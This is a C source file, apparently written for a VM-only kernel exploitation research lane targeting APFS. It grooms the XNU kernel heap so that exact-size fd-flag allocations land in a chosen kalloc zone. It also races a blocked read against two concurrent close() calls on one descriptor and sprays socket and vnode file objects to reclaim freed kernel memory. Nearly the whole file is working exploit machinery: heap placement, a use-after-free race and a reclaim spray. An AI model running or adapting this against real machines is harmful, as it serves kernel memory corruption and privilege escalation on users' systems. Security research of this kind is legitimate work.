/*
 * VM-ONLY placement groom for the APFS _btree_node_compact research lane.
 *
 * Each child asks fdt_grow() for slot (allocation_size - 1) after setting
 * RLIMIT_NOFILE to allocation_size.  On 26A5378n this leaves one exact-size
 * fd-flags allocation alive in data.kalloc.<allocation_size> per child.
 *
 * This is a placement/sizing groom.  fd flag bytes provide only weak content
 * control (mostly zero, with FD_CLOEXEC set on the high descriptor).
 */

#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <pthread/qos.h>
#include <signal.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

struct worker_status {
    pid_t pid;
    int high_fd;
    int error;
};

static volatile sig_atomic_t stop_requested;
static volatile sig_atomic_t lifecycle_usr1;
static volatile sig_atomic_t lifecycle_usr2;
static volatile sig_atomic_t lifecycle_run_reclaim;
static volatile sig_atomic_t lifecycle_reader_released;
static volatile sig_atomic_t spray_stop;

enum {
    RECLAIM_SPRAY_THREADS = 12,
    RECLAIM_SPRAY_SLOTS = 1024,
};

static void
request_stop(int signo)
{
    (void)signo;
    stop_requested = 1;
}

static void
request_lifecycle_stage(int signo)
{
    if (signo == SIGUSR1) {
        lifecycle_usr1 = 1;
    } else if (signo == SIGUSR2) {
        lifecycle_usr2 = 1;
    } else if (signo == SIGURG) {
        lifecycle_run_reclaim = 1;
    }
}

static void
usage(const char *program)
{
    fprintf(stderr,
        "usage: %s [-l | -r] [-n workers] [-s allocation_size]\n"
        "defaults: workers=32 allocation_size=16384\n"
        "  -l  arm each worker for a SIGUSR1/SIGUSR2 close-lifecycle test\n"
        "  -r  lifecycle plus SIGURG-triggered mixed fileproc/fileglob spray\n",
        program);
}

static int
parse_positive(const char *text, long minimum, long maximum, long *result)
{
    char *end = NULL;
    long value;

    errno = 0;
    value = strtol(text, &end, 0);
    if (errno != 0 || end == text || *end != '\0' ||
        value < minimum || value > maximum) {
        return -1;
    }

    *result = value;
    return 0;
}

static void
sleep_milliseconds(long milliseconds)
{
    struct timespec delay = {
        .tv_sec = milliseconds / 1000,
        .tv_nsec = (milliseconds % 1000) * 1000000L,
    };

    while (nanosleep(&delay, &delay) != 0 && errno == EINTR) {
    }
}

struct lifecycle_thread {
    int fd;
    const char *name;
    qos_class_t qos;
};

struct reclaim_spray {
    int seed_fd;
    unsigned int index;
};

static void
lifecycle_log(const char *format, ...)
{
    char buffer[256];
    va_list arguments;
    int length;

    va_start(arguments, format);
    length = vsnprintf(buffer, sizeof(buffer), format, arguments);
    va_end(arguments);
    if (length <= 0) {
        return;
    }
    if ((size_t)length >= sizeof(buffer)) {
        length = (int)sizeof(buffer) - 1;
    }
    (void)write(STDERR_FILENO, buffer, (size_t)length);
}

static void *
lifecycle_reader(void *argument)
{
    struct lifecycle_thread *thread = argument;
    char byte;
    ssize_t result;

    (void)pthread_set_qos_class_self_np(thread->qos, 0);
    lifecycle_log("LIFECYCLE pid=%d stage=%s-enter fd=%d\n",
        getpid(), thread->name, thread->fd);
    result = read(thread->fd, &byte, sizeof(byte));
    lifecycle_log(
        "LIFECYCLE pid=%d stage=%s-return fd=%d result=%zd errno=%d\n",
        getpid(), thread->name, thread->fd, result,
        result < 0 ? errno : 0);
    return NULL;
}

static void *
lifecycle_closer(void *argument)
{
    struct lifecycle_thread *thread = argument;
    int result;

    (void)pthread_set_qos_class_self_np(thread->qos, 0);
    lifecycle_log("LIFECYCLE pid=%d stage=%s-enter fd=%d\n",
        getpid(), thread->name, thread->fd);
    result = close(thread->fd);
    lifecycle_log(
        "LIFECYCLE pid=%d stage=%s-return fd=%d result=%d errno=%d\n",
        getpid(), thread->name, thread->fd, result,
        result < 0 ? errno : 0);
    return NULL;
}

static void *
reclaim_sprayer(void *argument)
{
    struct reclaim_spray *spray = argument;
    int descriptors[RECLAIM_SPRAY_SLOTS];
    unsigned int cursor;
    unsigned int successes = 0;
    int saved_errno = 0;
    const char *type = (spray->index & 1) ? "socket" : "vnode";

    memset(descriptors, 0xff, sizeof(descriptors));
    (void)pthread_set_qos_class_self_np(QOS_CLASS_USER_INTERACTIVE, 0);

    while (!lifecycle_run_reclaim && !spray_stop) {
        sched_yield();
    }
    if (spray_stop) {
        return NULL;
    }

    if (spray->index == 0) {
        char release = 'R';

        if (write(spray->seed_fd, &release, sizeof(release)) !=
            sizeof(release)) {
            lifecycle_log(
                "LIFECYCLE pid=%d stage=reclaim-reader-release-failed "
                "errno=%d\n", getpid(), errno);
            return NULL;
        }
        lifecycle_reader_released = 1;
        lifecycle_log(
            "LIFECYCLE pid=%d stage=reclaim-reader-released\n", getpid());
    } else {
        while (!lifecycle_reader_released && !spray_stop) {
            sched_yield();
        }
    }

    for (cursor = 0; cursor < RECLAIM_SPRAY_SLOTS; cursor++) {
        int descriptor;

        if (spray->index & 1) {
            descriptor = socket(AF_UNIX, SOCK_DGRAM, 0);
        } else {
            descriptor = open("/dev/null", O_RDONLY | O_CLOEXEC);
        }
        if (descriptor < 0) {
            saved_errno = errno;
            break;
        }
        descriptors[cursor] = descriptor;
        successes++;
    }
    lifecycle_log(
        "LIFECYCLE pid=%d stage=spray%u-filled type=%s successes=%u "
        "errno=%d\n",
        getpid(), spray->index, type, successes, saved_errno);

    while (!spray_stop) {
        sched_yield();
    }

    for (cursor = 0; cursor < successes; cursor++) {
        if (descriptors[cursor] >= 0) {
            close(descriptors[cursor]);
        }
    }
    lifecycle_log(
        "LIFECYCLE pid=%d stage=spray%u-return type=%s successes=%u\n",
        getpid(), spray->index, type, successes);
    return NULL;
}

static void
write_status(int status_fd, int high_fd, int error)
{
    struct worker_status status = {
        .pid = getpid(),
        .high_fd = high_fd,
        .error = error,
    };
    ssize_t ignored = write(status_fd, &status, sizeof(status));

    (void)ignored;
    close(status_fd);
}

static void
close_worker_fds(int hold_fd, int high_fd, int seed_fd)
{
    close(hold_fd);
    if (high_fd >= 0) {
        close(high_fd);
    }
    if (seed_fd >= 0) {
        close(seed_fd);
    }
}

static void
lifecycle_worker_loop(
    int hold_fd, int high_fd, int seed_fd, int reclaim_mode)
{
    pthread_t reader_thread;
    pthread_t close1_thread;
    pthread_t close2_thread;
    pthread_t spray_threads[RECLAIM_SPRAY_THREADS];
    struct reclaim_spray sprays[RECLAIM_SPRAY_THREADS];
    struct lifecycle_thread reader = {
        .fd = high_fd,
        .name = "reader",
        .qos = QOS_CLASS_DEFAULT,
    };
    struct lifecycle_thread close1 = {
        .fd = high_fd,
        .name = "close1",
        .qos = QOS_CLASS_UTILITY,
    };
    struct lifecycle_thread close2 = {
        .fd = high_fd,
        .name = "close2",
        .qos = QOS_CLASS_USER_INTERACTIVE,
    };
    int reader_started = 0;
    int close1_started = 0;
    int close2_started = 0;
    int spray_started = 0;
    struct sigaction action;

    memset(&action, 0, sizeof(action));
    action.sa_handler = request_lifecycle_stage;
    sigemptyset(&action.sa_mask);
    if (sigaction(SIGUSR1, &action, NULL) != 0 ||
        sigaction(SIGUSR2, &action, NULL) != 0 ||
        sigaction(SIGURG, &action, NULL) != 0) {
        _exit(EXIT_FAILURE);
    }

    if (fcntl(hold_fd, F_SETFL, fcntl(hold_fd, F_GETFL) | O_NONBLOCK) < 0) {
        _exit(EXIT_FAILURE);
    }

    for (;;) {
        char byte;
        ssize_t hold_result;

        hold_result = read(hold_fd, &byte, sizeof(byte));
        if (hold_result == 0) {
            break;
        }
        if (hold_result < 0 && errno != EAGAIN && errno != EINTR) {
            break;
        }

        if (lifecycle_usr1 && !reader_started) {
            lifecycle_usr1 = 0;
            if (pthread_create(&reader_thread, NULL,
                    lifecycle_reader, &reader) != 0) {
                _exit(EXIT_FAILURE);
            }
            reader_started = 1;
            sleep_milliseconds(250);
            if (pthread_create(&close1_thread, NULL,
                    lifecycle_closer, &close1) != 0) {
                _exit(EXIT_FAILURE);
            }
            close1_started = 1;
            lifecycle_log(
                "LIFECYCLE pid=%d stage=close1-launched fd=%d\n",
                getpid(), high_fd);
        } else if (lifecycle_usr2 &&
            reader_started && close1_started && !close2_started) {
            char release = 'R';

            lifecycle_usr2 = 0;
            if (reclaim_mode) {
                spray_stop = 0;
                for (unsigned int index = 0;
                    index < RECLAIM_SPRAY_THREADS; index++) {
                    sprays[index].seed_fd = seed_fd;
                    sprays[index].index = index;
                    if (pthread_create(&spray_threads[index], NULL,
                            reclaim_sprayer, &sprays[index]) != 0) {
                        _exit(EXIT_FAILURE);
                    }
                    spray_started++;
                }
                lifecycle_log(
                    "LIFECYCLE pid=%d stage=spray-launched threads=%d\n",
                    getpid(), spray_started);
                sleep_milliseconds(100);
            }
            if (pthread_create(&close2_thread, NULL,
                    lifecycle_closer, &close2) != 0) {
                _exit(EXIT_FAILURE);
            }
            close2_started = 1;
            lifecycle_log(
                "LIFECYCLE pid=%d stage=close2-launched fd=%d\n",
                getpid(), high_fd);
            if (!reclaim_mode) {
                sleep_milliseconds(250);
                if (write(seed_fd, &release, sizeof(release)) !=
                    sizeof(release)) {
                    _exit(EXIT_FAILURE);
                }
                lifecycle_log(
                    "LIFECYCLE pid=%d stage=reader-released fd=%d\n",
                    getpid(), high_fd);
            }
        }
        sleep_milliseconds(100);
    }

    spray_stop = 1;
    close_worker_fds(hold_fd, high_fd, seed_fd);
    _exit(EXIT_SUCCESS);
}

static void
worker(int hold_fd, int status_fd, rlim_t allocation_size,
    int lifecycle_mode, int reclaim_mode)
{
    struct rlimit limit;
    int seed_fd = -1;
    int high_fd = -1;
    int saved_errno;
    char fifo_path[128];

    if (getrlimit(RLIMIT_NOFILE, &limit) != 0) {
        write_status(status_fd, -1, errno);
        close_worker_fds(hold_fd, high_fd, seed_fd);
        _exit(EXIT_FAILURE);
    }
    if (allocation_size > limit.rlim_max) {
        write_status(status_fd, -1, EOVERFLOW);
        close_worker_fds(hold_fd, high_fd, seed_fd);
        _exit(EXIT_FAILURE);
    }

    limit.rlim_cur = allocation_size;
    if (setrlimit(RLIMIT_NOFILE, &limit) != 0) {
        write_status(status_fd, -1, errno);
        close_worker_fds(hold_fd, high_fd, seed_fd);
        _exit(EXIT_FAILURE);
    }

    if (lifecycle_mode) {
        snprintf(fifo_path, sizeof(fifo_path),
            "/tmp/codex_fd_lifecycle.%d", getpid());
        unlink(fifo_path);
        if (mkfifo(fifo_path, 0600) != 0) {
            write_status(status_fd, -1, errno);
            close_worker_fds(hold_fd, high_fd, seed_fd);
            _exit(EXIT_FAILURE);
        }
        seed_fd = open(fifo_path, O_RDWR);
        saved_errno = errno;
        unlink(fifo_path);
        errno = saved_errno;
    } else {
        seed_fd = open("/dev/null", O_RDONLY);
    }
    if (seed_fd < 0) {
        write_status(status_fd, -1, errno);
        close_worker_fds(hold_fd, high_fd, seed_fd);
        _exit(EXIT_FAILURE);
    }

    high_fd = fcntl(seed_fd, F_DUPFD, (int)allocation_size - 1);
    if (high_fd < 0) {
        write_status(status_fd, -1, errno);
        close_worker_fds(hold_fd, high_fd, seed_fd);
        _exit(EXIT_FAILURE);
    }
    if (high_fd != (int)allocation_size - 1) {
        write_status(status_fd, high_fd, ERANGE);
        close_worker_fds(hold_fd, high_fd, seed_fd);
        _exit(EXIT_FAILURE);
    }

    if (fcntl(high_fd, F_SETFD, FD_CLOEXEC) != 0) {
        saved_errno = errno;
        write_status(status_fd, high_fd, saved_errno);
        close_worker_fds(hold_fd, high_fd, seed_fd);
        _exit(EXIT_FAILURE);
    }

    write_status(status_fd, high_fd, 0);
    if (lifecycle_mode) {
        lifecycle_worker_loop(hold_fd, high_fd, seed_fd, reclaim_mode);
    } else {
        char byte;

        while (read(hold_fd, &byte, sizeof(byte)) < 0 && errno == EINTR) {
        }
        close_worker_fds(hold_fd, high_fd, seed_fd);
        _exit(EXIT_SUCCESS);
    }
}

int
main(int argc, char **argv)
{
    long worker_count = 32;
    long allocation_size = 16384;
    int hold_pipe[2];
    int status_pipe[2];
    pid_t *children;
    long spawned = 0;
    long ready = 0;
    int lifecycle_mode = 0;
    int reclaim_mode = 0;
    int option;
    struct sigaction action;

    while ((option = getopt(argc, argv, "lrn:s:h")) != -1) {
        switch (option) {
        case 'l':
            lifecycle_mode = 1;
            break;
        case 'r':
            lifecycle_mode = 1;
            reclaim_mode = 1;
            break;
        case 'n':
            if (parse_positive(optarg, 1, 4096, &worker_count) != 0) {
                usage(argv[0]);
                return EXIT_FAILURE;
            }
            break;
        case 's':
            if (parse_positive(optarg, 50, 1048576, &allocation_size) != 0) {
                usage(argv[0]);
                return EXIT_FAILURE;
            }
            break;
        case 'h':
        default:
            usage(argv[0]);
            return option == 'h' ? EXIT_SUCCESS : EXIT_FAILURE;
        }
    }

    if (optind != argc) {
        usage(argv[0]);
        return EXIT_FAILURE;
    }

    children = calloc((size_t)worker_count, sizeof(*children));
    if (children == NULL) {
        perror("calloc");
        return EXIT_FAILURE;
    }
    if (pipe(hold_pipe) != 0 || pipe(status_pipe) != 0) {
        perror("pipe");
        free(children);
        return EXIT_FAILURE;
    }

    memset(&action, 0, sizeof(action));
    action.sa_handler = request_stop;
    sigemptyset(&action.sa_mask);
    if (sigaction(SIGINT, &action, NULL) != 0 ||
        sigaction(SIGTERM, &action, NULL) != 0) {
        perror("sigaction");
        free(children);
        return EXIT_FAILURE;
    }

    for (long index = 0; index < worker_count; index++) {
        pid_t child = fork();
        if (child < 0) {
            perror("fork");
            stop_requested = 1;
            break;
        }
        if (child == 0) {
            close(hold_pipe[1]);
            close(status_pipe[0]);
            worker(hold_pipe[0], status_pipe[1],
                (rlim_t)allocation_size, lifecycle_mode, reclaim_mode);
        }
        children[spawned++] = child;
    }

    close(hold_pipe[0]);
    close(status_pipe[1]);

    while (ready < spawned && !stop_requested) {
        struct worker_status status;
        ssize_t amount = read(status_pipe[0], &status, sizeof(status));

        if (amount == (ssize_t)sizeof(status)) {
            if (status.error != 0) {
                fprintf(stderr, "worker %d failed: %s\n",
                    status.pid, strerror(status.error));
                stop_requested = 1;
                break;
            }
            ready++;
            printf("worker %d holds high fd %d (%ld/%ld ready)\n",
                status.pid, status.high_fd, ready, spawned);
            fflush(stdout);
            continue;
        }
        if (amount < 0 && errno == EINTR) {
            continue;
        }
        fprintf(stderr, "status pipe closed before all workers were ready\n");
        stop_requested = 1;
        break;
    }

    close(status_pipe[0]);
    if (!stop_requested) {
        printf("%ld exact-size data.kalloc.%ld fd-flag allocations held; "
            "%spress Ctrl-C to release\n", ready, allocation_size,
            lifecycle_mode ? "SIGUSR1/SIGUSR2 lifecycle armed; " : "");
        fflush(stdout);
        while (!stop_requested) {
            pause();
        }
    }

    close(hold_pipe[1]);
    for (long index = 0; index < spawned; index++) {
        while (waitpid(children[index], NULL, 0) < 0 && errno == EINTR) {
        }
    }
    free(children);

    return ready == spawned ? EXIT_SUCCESS : EXIT_FAILURE;
}
